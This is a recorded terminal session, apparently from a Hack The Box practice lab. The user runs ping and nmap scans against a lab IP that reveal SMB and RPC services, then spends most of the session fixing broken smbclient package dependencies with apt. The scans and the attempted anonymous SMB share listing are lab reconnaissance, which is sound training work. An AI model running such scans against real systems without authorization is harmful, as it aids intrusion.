@@ -1,0 +1,449 @@
+Script started on 2025-05-31 15:15:53-04:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="126" LINES="22"]
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mping $ip
+[?2004lping: usage error: Destination address required
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mip=10.129.214.56
+[?2004l[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mip=10.129.214.56[C[C[C[C[C[C[8Pping $ip
+[?2004lPING 10.129.214.56 (10.129.214.56) 56(84) bytes of data.
+64 bytes from 10.129.214.56: icmp_seq=1 ttl=127 time=88.9 ms
+64 bytes from 10.129.214.56: icmp_seq=2 ttl=127 time=89.5 ms
+^C
+--- 10.129.214.56 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 88.942/89.212/89.483/0.270 ms
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mnmap -sS -F $ip
+[?2004lStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 15:16 EDT
+Nmap scan report for 10.129.214.56
+Host is up (0.10s latency).
+Not shown: 97 closed tcp ports (reset)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mnmap -sS -F $ip[1P[1@C[C[1@ [1@-[1@s[1@V
+[?2004lStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 15:17 EDT
+Nmap scan report for 10.129.214.56
+Host is up (0.13s latency).
+Not shown: 97 closed tcp ports (reset)
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: 4h00m01s
+| smb2-time: 
+|   date: 2025-05-31T23:18:01
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0msmbclient -N -L //$ip
+[?2004lbash: smbclient: command not found
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0maapt[K[K[Kpt instakk [K[K[Kll smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+Some packages could not be installed. This may mean that you have
+requested an impossible situation or if you are using the unstable
+distribution that some required packages have not yet been created
+or been moved out of Incoming.
+The following information may help to resolve the situation:
+
+The following packages have unmet dependencies:
+ smbclient : Depends: samba-common (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+             Depends: samba-libs (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+[1;31mE: [0mUnable to correct problems, you have held broken packages.[0m
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt install -f
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt install -f smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+Some packages could not be installed. This may mean that you have
+requested an impossible situation or if you are using the unstable
+distribution that some required packages have not yet been created
+or been moved out of Incoming.
+The following information may help to resolve the situation:
+
+The following packages have unmet dependencies:
+ smbclient : Depends: samba-common (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+             Depends: samba-libs (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+[1;31mE: [0mUnable to correct problems, you have held broken packages.[0m
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mp[Kapt --fix-missing instll[K[Kall
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt --fix-missing install smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+Some packages could not be installed. This may mean that you have
+requested an impossible situation or if you are using the unstable
+distribution that some required packages have not yet been created
+or been moved out of Incoming.
+The following information may help to resolve the situation:
+
+The following packages have unmet dependencies:
+ smbclient : Depends: samba-common (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+             Depends: samba-libs (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+[1;31mE: [0mUnable to correct problems, you have held broken packages.[0m
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt --fix-broken instll
+[?2004l[1;31mE: [0mCommand line option --fix-broken is not understood in combination with the other options[0m
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt --fix-broken instll[K[Kall
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt update
+[?2004l[33m0% [Working][0m[33m0% [Waiting for headers][0m                        Hit:1 https://deb.parrot.sh/parrot lory InRelease
+[33m                        0% [Working][0m            Hit:2 https://deb.parrot.sh/direct/parrot lory-security InRelease
+[33m0% [Working][0m            Hit:3 https://deb.parrot.sh/parrot lory-backports InRelease
+[33m0% [Working][0m[33m0% [Working][0m[33m0% [Working][0m[33m20% [Working][0m             Reading package lists... 0%Reading package lists... 0%Reading package lists... 0%Reading package lists... 55%Reading package lists... 88%Reading package lists... 88%Reading package lists... 88%Reading package lists... 88%Reading package lists... 89%Reading package lists... 89%Reading package lists... 89%Reading package lists... 89%Reading package lists... 92%Reading package lists... 92%Reading package lists... 92%Reading package lists... 92%Reading package lists... 92%Reading package lists... 92%Reading package lists... 96%Reading package lists... 96%Reading package lists... 96%Reading package lists... 96%Reading package lists... 96%Reading package lists... 96%Reading package lists... 96%Reading package lists... 96%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+All packages are up to date.
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt install smb
+smb2www        smb4k          smbclient      smbios-utils   smbldap-tools  smbmap         smb-nat        smbnetfs
+[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt install smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+Some packages could not be installed. This may mean that you have
+requested an impossible situation or if you are using the unstable
+distribution that some required packages have not yet been created
+or been moved out of Incoming.
+The following information may help to resolve the situation:
+
+The following packages have unmet dependencies:
+ smbclient : Depends: samba-common (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+             Depends: samba-libs (= 2:4.17.12+dfsg-0+deb12u1) but 2:4.22.1+dfsg-1~bpo12+1 is to be installed
+[1;31mE: [0mUnable to correct problems, you have held broken packages.[0m
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mat[Kpt install samba-common
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+samba-common is already the newest version (2:4.22.1+dfsg-1~bpo12+1).
+samba-common set to manually installed.
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt [K[K[K[Ksmbclient
+[?2004lbash: smbclient: command not found
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt remove samba-common samba-common-bin libwbclient0 samba-libs
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  gtk2-engines-murrine libgdata-common libgdata22 libgoa-1.0-0b libgoa-1.0-common libldb2 libtalloc2 libtevent0 mate-themes
+  python3-ldb python3-talloc python3-tdb tdb-tools
+Use 'sudo apt autoremove' to remove them.
+The following additional packages will be installed:
+  parrot-desktop-stub
+The following packages will be REMOVED:
+  caja-share gvfs-backends libsmbclient libwbclient0 mate-core mate-desktop-environment-core parrot-desktop-mate
+  python3-samba python3-smbc samba-common samba-common-bin samba-libs vlc-plugin-samba
+The following NEW packages will be installed:
+  parrot-desktop-stub
+0 upgraded, 1 newly installed, 13 to remove and 0 not upgraded.
+Need to get 7,008 B of archives.
+After this operation, 54.8 MB disk space will be freed.
+Do you want to continue? [Y/n] T Y
+[33m0% [Working][0m[33m0% [Connecting to deb.parrot.sh][0m                                Get:1 https://deb.parrot.sh/parrot lory/main amd64 parrot-desktop-stub all 6.2.3 [7,008 B]
+[33m47% [1 parrot-desktop-stub 4,096 B/7,008 B 58%][0m[33m                                               100% [Working][0m              Fetched 7,008 B in 1s (7,538 B/s)
+
+7[0;21r8[1A(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 371037 files and directories currently installed.)
+Removing caja-share (1.26.1-1.2) ...
+7[22;0f[42m[30mProgress: [  0%][49m[39m [........................................................................................................] 87[22;0f[42m[30mProgress: [  3%][49m[39m [###.....................................................................................................] 87[22;0f[42m[30mProgress: [  6%][49m[39m [######..................................................................................................] 8Selecting previously unselected package parrot-desktop-stub.
+(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 371029 files and directories currently installed.)
+Preparing to unpack .../parrot-desktop-stub_6.2.3_all.deb ...
+7[22;0f[42m[30mProgress: [ 10%][49m[39m [##########..............................................................................................] 8Unpacking parrot-desktop-stub (6.2.3) ...
+7[22;0f[42m[30mProgress: [ 13%][49m[39m [#############...........................................................................................] 8(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 371032 files and directories currently installed.)
+Removing python3-smbc (1.0.23-2+b4) ...
+7[22;0f[42m[30mProgress: [ 16%][49m[39m [################........................................................................................] 87[22;0f[42m[30mProgress: [ 19%][49m[39m [####################....................................................................................] 8[1mdpkg:[0m [1;33mwarning:[0m while removing python3-smbc, directory '/usr/lib/python3/dist-packages/smbc' not empty so not removed
+Removing vlc-plugin-samba:amd64 (3.0.21-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 23%][49m[39m [#######################.................................................................................] 87[22;0f[42m[30mProgress: [ 26%][49m[39m [##########################..............................................................................] 8Removing samba-common-bin (2:4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 27%][49m[39m [############################............................................................................] 87[22;0f[42m[30mProgress: [ 30%][49m[39m [###############################.........................................................................] 8Removing python3-samba (2:4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 33%][49m[39m [##################################......................................................................] 87[22;0f[42m[30mProgress: [ 36%][49m[39m [#####################################...................................................................] 8[1mdpkg:[0m [1;33mwarning:[0m while removing python3-samba, directory '/usr/lib/python3/dist-packages/samba' not empty so not removed
+Removing samba-common (2:4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 39%][49m[39m [########################################................................................................] 87[22;0f[42m[30mProgress: [ 42%][49m[39m [############################################............................................................] 8[1mdpkg:[0m parrot-desktop-mate: dependency problems, but removing anyway as you requested:
+ parrot-interface depends on parrot-desktop-mate | parrot-desktop-stub | parrot-desktop-kde | parrot-desktop-xfce | parrot-desktop-i3 | parrot-desktop-gnome | parrot-kde | parrot-xfce; however:
+  Package parrot-desktop-mate is to be removed.
+  Package parrot-desktop-stub is not configured yet.
+  Package parrot-desktop-kde is not installed.
+  Package parrot-desktop-xfce is not installed.
+  Package parrot-desktop-i3 is not installed.
+  Package parrot-desktop-gnome is not installed.
+  Package parrot-kde is not installed.
+  Package parrot-xfce is not installed.
+
+Removing parrot-desktop-mate (6.2.3) ...
+7[22;0f[42m[30mProgress: [ 45%][49m[39m [###############################################.........................................................] 87[22;0f[42m[30mProgress: [ 48%][49m[39m [##################################################......................................................] 8Removing mate-core (1.26.0+1) ...
+7[22;0f[42m[30mProgress: [ 52%][49m[39m [#####################################################...................................................] 87[22;0f[42m[30mProgress: [ 55%][49m[39m [########################################################................................................] 8Removing mate-desktop-environment-core (1.26.0+1) ...
+7[22;0f[42m[30mProgress: [ 58%][49m[39m [###########################################################.............................................] 87[22;0f[42m[30mProgress: [ 61%][49m[39m [###############################################################.........................................] 8Removing gvfs-backends (1.50.3-1) ...
+7[22;0f[42m[30mProgress: [ 63%][49m[39m [#################################################################.......................................] 8Removing libsmbclient:amd64 (2:4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 66%][49m[39m [####################################################################....................................] 87[22;0f[42m[30mProgress: [ 69%][49m[39m [#######################################################################.................................] 8Removing samba-libs:amd64 (2:4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 71%][49m[39m [##########################################################################..............................] 87[22;0f[42m[30mProgress: [ 74%][49m[39m [#############################################################################...........................] 8Removing libwbclient0:amd64 (2:4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 77%][49m[39m [################################################################################........................] 87[22;0f[42m[30mProgress: [ 80%][49m[39m [###################################################################################.....................] 8Setting up parrot-desktop-stub (6.2.3) ...
+7[22;0f[42m[30mProgress: [ 83%][49m[39m [######################################################################################..................] 87[22;0f[42m[30mProgress: [ 86%][49m[39m [#########################################################################################...............] 8Processing triggers for libvlc-bin:amd64 (3.0.21-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 89%][49m[39m [############################################################################################............] 87[22;0f[42m[30mProgress: [ 91%][49m[39m [###############################################################################################.........] 8Processing triggers for libglib2.0-0:amd64 (2.74.6-2+deb12u6) ...
+7[22;0f[42m[30mProgress: [ 94%][49m[39m [##################################################################################################......] 87[22;0f[42m[30mProgress: [ 97%][49m[39m [#####################################################################################################...] 8Processing triggers for libc-bin (2.36-9+deb12u10) ...
+Processing triggers for man-db (2.11.2-2) ...
+
+7[0;22r8[1A[JScanning application launchers
+Removing duplicate launchers or broken launchers
+ [-] Missing executable file kcmshell5 at launcher /usr/share/applications/kcm_trash.desktop
+Launchers are updated
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0msudp [K[K[K[K[Kapt install smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+Some packages could not be installed. This may mean that you have
+requested an impossible situation or if you are using the unstable
+distribution that some required packages have not yet been created
+or been moved out of Incoming.
+The following information may help to resolve the situation:
+
+The following packages have unmet dependencies:
+ libldb2 : Breaks: samba-libs (< 2:4.19.0~) but 2:4.17.12+dfsg-0+deb12u1 is to be installed
+[1;31mE: [0mUnable to correct problems, you have held broken packages.[0m
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt remove smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+Package 'smbclient' is not installed, so not removed
+The following packages were automatically installed and are no longer required:
+  gtk2-engines-murrine libgdata-common libgdata22 libgoa-1.0-0b libgoa-1.0-common libldb2 libtalloc2 libtevent0 mate-themes
+  python3-ldb python3-talloc python3-tdb tdb-tools
+Use 'sudo apt autoremove' to remove them.
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt purge smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+Package 'smbclient' is not installed, so not removed
+The following packages were automatically installed and are no longer required:
+  gtk2-engines-murrine libgdata-common libgdata22 libgoa-1.0-0b libgoa-1.0-common libldb2 libtalloc2 libtevent0 mate-themes
+  python3-ldb python3-talloc python3-tdb tdb-tools
+Use 'sudo apt autoremove' to remove them.
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt autoremove
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+The following packages will be REMOVED:
+  gtk2-engines-murrine libgdata-common libgdata22 libgoa-1.0-0b libgoa-1.0-common libldb2 libtalloc2 libtevent0 mate-themes
+  python3-ldb python3-talloc python3-tdb tdb-tools
+0 upgraded, 0 newly installed, 13 to remove and 0 not upgraded.
+After this operation, 88.2 MB disk space will be freed.
+Do you want to continue? [Y/n] Y
+
+7[0;21r8[1A(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 370355 files and directories currently installed.)
+Removing mate-themes (3.22.23-1) ...
+7[22;0f[42m[30mProgress: [  0%][49m[39m [........................................................................................................] 87[22;0f[42m[30mProgress: [  4%][49m[39m [###.....................................................................................................] 87[22;0f[42m[30mProgress: [  7%][49m[39m [#######.................................................................................................] 8Removing gtk2-engines-murrine:amd64 (0.98.2-3+b1) ...
+7[22;0f[42m[30mProgress: [ 11%][49m[39m [###########.............................................................................................] 87[22;0f[42m[30mProgress: [ 15%][49m[39m [###############.........................................................................................] 8Removing libgdata22:amd64 (0.18.1-2) ...
+7[22;0f[42m[30mProgress: [ 19%][49m[39m [###################.....................................................................................] 87[22;0f[42m[30mProgress: [ 22%][49m[39m [#######################.................................................................................] 8Removing libgdata-common (0.18.1-2) ...
+7[22;0f[42m[30mProgress: [ 26%][49m[39m [##########################..............................................................................] 87[22;0f[42m[30mProgress: [ 30%][49m[39m [##############################..........................................................................] 8Removing libgoa-1.0-0b:amd64 (3.46.0-1) ...
+7[22;0f[42m[30mProgress: [ 33%][49m[39m [##################################......................................................................] 87[22;0f[42m[30mProgress: [ 37%][49m[39m [######################################..................................................................] 8Removing libgoa-1.0-common (3.46.0-1) ...
+7[22;0f[42m[30mProgress: [ 41%][49m[39m [##########################################..............................................................] 87[22;0f[42m[30mProgress: [ 44%][49m[39m [##############################################..........................................................] 8Removing python3-ldb (2:2.11.0+samba4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 48%][49m[39m [##################################################......................................................] 8Removing libldb2:amd64 (2:2.11.0+samba4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 52%][49m[39m [#####################################################...................................................] 87[22;0f[42m[30mProgress: [ 55%][49m[39m [#########################################################...............................................] 8Removing python3-talloc:amd64 (2:2.4.3+samba4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 59%][49m[39m [############################################################............................................] 87[22;0f[42m[30mProgress: [ 62%][49m[39m [################################################################........................................] 8Removing libtevent0:amd64 (2:0.16.2+samba4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 66%][49m[39m [####################################################################....................................] 87[22;0f[42m[30mProgress: [ 69%][49m[39m [#######################################################################.................................] 8Removing libtalloc2:amd64 (2:2.4.3+samba4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 72%][49m[39m [###########################################################################.............................] 87[22;0f[42m[30mProgress: [ 76%][49m[39m [##############################################################################..........................] 8Removing python3-tdb (2:1.4.13+samba4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 79%][49m[39m [##################################################################################......................] 87[22;0f[42m[30mProgress: [ 83%][49m[39m [######################################################################################..................] 8Removing tdb-tools (2:1.4.13+samba4.22.1+dfsg-1~bpo12+1) ...
+7[22;0f[42m[30mProgress: [ 86%][49m[39m [#########################################################################################...............] 87[22;0f[42m[30mProgress: [ 90%][49m[39m [#############################################################################################...........] 8Processing triggers for libc-bin (2.36-9+deb12u10) ...
+Processing triggers for man-db (2.11.2-2) ...
+Processing triggers for mate-icon-theme (1.26.0-1) ...
+Processing triggers for libglib2.0-0:amd64 (2.74.6-2+deb12u6) ...
+7[22;0f[42m[30mProgress: [ 93%][49m[39m [################################################################################################........] 87[22;0f[42m[30mProgress: [ 97%][49m[39m [####################################################################################################....] 8
+7[0;22r8[1A[JScanning application launchers
+Removing duplicate launchers or broken launchers
+ [-] Missing executable file kcmshell5 at launcher /usr/share/applications/kcm_trash.desktop
+Launchers are updated
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mapt install smbclient
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+The following additional packages will be installed:
+  libldb2 libsmbclient libtalloc2 libtevent0 libwbclient0 samba-common samba-libs
+Suggested packages:
+  cifs-utils heimdal-clients
+Recommended packages:
+  samba-common-bin
+The following NEW packages will be installed:
+  libldb2 libsmbclient libtalloc2 libtevent0 libwbclient0 samba-common samba-libs smbclient
+0 upgraded, 8 newly installed, 0 to remove and 0 not upgraded.
+Need to get 6,550 kB of archives.
+After this operation, 28.7 MB of additional disk space will be used.
+Do you want to continue? [Y/n] Y
+[33m0% [Working][0m            Get:1 https://deb.parrot.sh/parrot lory/main amd64 libtalloc2 amd64 2.4.0-f2 [25.6 kB]
+[33m0% [1 libtalloc2 0 B/25.6 kB 0%][0m[33m                                3% [Working][0m            Get:2 https://deb.parrot.sh/parrot lory/main amd64 libtevent0 amd64 0.14.1-1 [37.9 kB]
+[33m3% [2 libtevent0 0 B/37.9 kB 0%][0m[33m                                6% [Waiting for headers][0m                        Get:3 https://deb.parrot.sh/parrot lory/main amd64 libldb2 amd64 2:2.6.2+samba4.17.12+dfsg-0+deb12u1 [162 kB]
+[33m6% [3 libldb2 0 B/162 kB 0%][0m[33m                            10% [Waiting for headers][0m                         Get:4 https://deb.parrot.sh/parrot lory/main amd64 libwbclient0 amd64 2:4.17.12+dfsg-0+deb12u1 [53.9 kB]
+[33m10% [4 libwbclient0 0 B/53.9 kB 0%][0m[33m                                   13% [Waiting for headers][0m                         Get:5 https://deb.parrot.sh/parrot lory/main amd64 samba-libs amd64 2:4.17.12+dfsg-0+deb12u1 [5,658 kB]
+[33m13% [5 samba-libs 0 B/5,658 kB 0%][0m[33m23% [5 samba-libs 780 kB/5,658 kB 14%][0m[33m32% [5 samba-libs 1,517 kB/5,658 kB 27%][0m[33m43% [5 samba-libs 2,411 kB/5,658 kB 43%][0m[33m54% [5 samba-libs 3,298 kB/5,658 kB 58%][0m[33m65% [5 samba-libs 4,191 kB/5,658 kB 74%][0m[33m75% [5 samba-libs 5,068 kB/5,658 kB 90%][0m[33m                                        85% [Waiting for headers][0m                         Get:6 https://deb.parrot.sh/parrot lory/main amd64 libsmbclient amd64 2:4.17.12+dfsg-0+deb12u1 [82.9 kB]
+[33m85% [6 libsmbclient 12.9 kB/82.9 kB 16%][0m[33m                                        89% [Waiting for headers][0m                         Get:7 https://deb.parrot.sh/parrot lory/main amd64 samba-common all 2:4.17.12+dfsg-0+deb12u1 [87.9 kB]
